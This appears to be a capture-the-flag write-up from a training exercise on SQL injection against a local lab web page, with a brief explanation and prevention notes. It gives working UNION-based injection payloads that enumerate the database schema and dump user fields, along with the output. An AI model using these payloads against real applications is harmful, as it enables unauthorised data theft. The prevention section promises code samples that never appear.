## SQL LOGIN INJECTION

SQL injection is a type of injection attack. Injection attacks occur when maliciously crafted inputs 
are submitted by an attacker, causing an application to perform an unintended action.

# Use: 
A successful SQL injection attack can 
- read sensitive data from the database, 
- modify database data (insert/update/delete), 
- execute administration operations on the database (such as shutdown the DBMS), 
- recover the content of a given file existing on the DBMS file system or write files into the file system, 
- in some cases, issue commands to the operating system

# prevention:
- You should always use parameterized statements where available, 
they are your number one protection against SQL injection.
- Here are some code samples in various languages:

- Principle of Least Privilege: applications should ensure that each process or software component can access and affect only the resources it needs. 
Apply “levels of clearance” as appropriate


## 42 EXAMPLE

page: http://192.168.0.16/index.php?page=member

We're going to be doing the same thing here as we did in the SQL image search injection. 
Insert the following commands into the image search bar:

# Test if vulnerable to SQL Injection
1 OR 1=1	

... we get all the results because every row is considered true.

# find table columns in the database for each table
1 OR 1=1 UNION SELECT table_name, column_name FROM information_schema.COLUMNS

... Here we find

First name: users
Surname : user_id

First name: users
Surname : first_name

First name: users
Surname : last_name

First name: users
Surname : town

First name: users
Surname : country

First name: users
Surname : planet

First name: users
Surname : Commentaire

First name: users
Surname : countersign

# look at the comment below each user
1 OR 1=1 UNION SELECT first_name, commentaire FROM users

... Here we find 

First name: Flag
Surname : Decrypt this password -> then lower all the char. Sh256 on it and it's good !
